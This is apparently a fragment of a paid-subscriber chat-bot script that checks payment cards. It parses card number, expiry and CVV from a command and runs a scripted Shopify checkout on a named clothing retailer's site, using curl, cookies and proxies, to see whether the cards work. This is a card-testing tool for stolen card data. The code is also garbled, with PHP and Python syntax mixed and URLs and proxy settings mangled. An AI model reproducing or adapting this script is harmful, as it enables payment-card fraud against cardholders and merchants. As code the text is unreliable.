        ...
        expiryDate = "UNTIL DEAD"
            ...
            foreach (paidUsers as index => line) :
                    ...
                    if (preg_match('/^(\/sf|\.sf|!sf)/', text)) :
                            ...
                            cc = multiexplode([":", "/", " ", "|"], message)[0]
                            mes = multiexplode([":", "/", " ", "|"], message)[1]
                            ano = multiexplode([":", "/", " ", "|"], message)[2]
                            cvv = multiexplode([":", "/", " ", "|"], message)[3]
                            amt = '1'
                            if (empty(cc) || empty(cvv) || empty(mes) || empty(ano)) :
                                ...
                                |×| REQ BY ↯ @username</b>",
                                    ...
                                    def Capture2(str, starting_word, ending_word)
                                    :
                                ...
                                site = "us.princesspolly.com"
                                id_c = '31275122819'
                                gate = "Shopify 12.99$"
                                
                                    #--- 1_REQ
                                ch = curl_init()
                                curl_setopt(ch, CURLOPT_URL, 'https:#us.princesspolly.com/cart/39670813720660:1?traffic_source=buy_now')
                                ...
                                headers[] = 'Accept: text/html,application/xhtml+xml,application/xmlq=0.9,image/avif,image/webp,*'''q=0.8'
                                ...
                                curl_close(ch)
                                    ...
                                    print "id id1-- cehck checkouts"
                                
                                ch = curl_init()
                                curl_setopt(ch, CURLOPT_URL, 'https:#' . site . '/6186270804/checkouts/' . checkouts . '')
                                ...
                                headers[] = 'method: POST'
                                headers[] = 'path: /6186270804/checkouts/' . checkouts . ''
                                headers[] = 'scheme: https'
                                headers[] = 'accept: text/html,application/xhtml+xml,application/xmlq=0.9,image/avif,image/webp,image/apng,'''*q=0.8,application/signed-exchangev=b3q=0.9'
                                headers[] = 'accept-language: es-PE,es-419q=0.9,esq=0.8,enq=0.7,ptq=0.6'
                                ...
                                curl_setopt(ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt')
                                curl_setopt(ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt')
                                curl_setopt(ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.token2.'&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-Standard%25203-6%2520Business%2520Day%2520Shipping-6.99&checkout%5Bclient_details%5D%5Bbrowser_width%5D=850&checkout%5Bclient_details%5D%5Bbrowser_height%5D=635&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=False&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300')
                                r3 = curl_exec(ch)
                                curl_close(ch)
                                ...
                                headers[] = 'scheme: https'
                                headers[] = 'accept: text/html,application/xhtml+xml,application/xmlq=0.9,image/avif,image/webp,image/apng,'''*q=0.8,application/signed-exchangev=b3q=0.9'
                                headers[] = 'accept-language: es-PE,esq=0.9'
                                ...
                                curl_setopt(ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt')
                                curl_setopt(ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt')
                                curl_setopt(ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.token3.'&previous_step=payment_method&step=&s='.sid.'&checkout%5Bpayment_gateway%5D=19268960340&checkout%5Bcredit_card%5D%5Bvault%5D=False&checkout%5Bdifferent_billing_address%5D=False&checkout%5Bremember_me%5D=False&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=%2B16312435756&checkout%5Btotal_price%5D='.total.'&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=850&checkout%5Bclient_details%5D%5Bbrowser_height%5D=635&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=False&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300
                                ')
                                r5 = curl_exec(ch)
                                sleep(5)
                                curl_close(ch)
                                ...
                                ch = curl_init()
                                curl_setopt(ch, CURLOPT_URL, 'https:#' . site . '/6186270804/checkouts/' . checkouts . '/processing?from_processing_page=1')
                                curl_setopt(ch, CURLOPT_HEADER, 1)
                                curl_setopt(ch, CURLOPT_PROXY, poxySocks4)
                                curl_setopt(ch, CURLOPT_PROXY, "proxy")
                                curl_setopt(ch, CURLOPT_PROXYUSERPWD, auth)
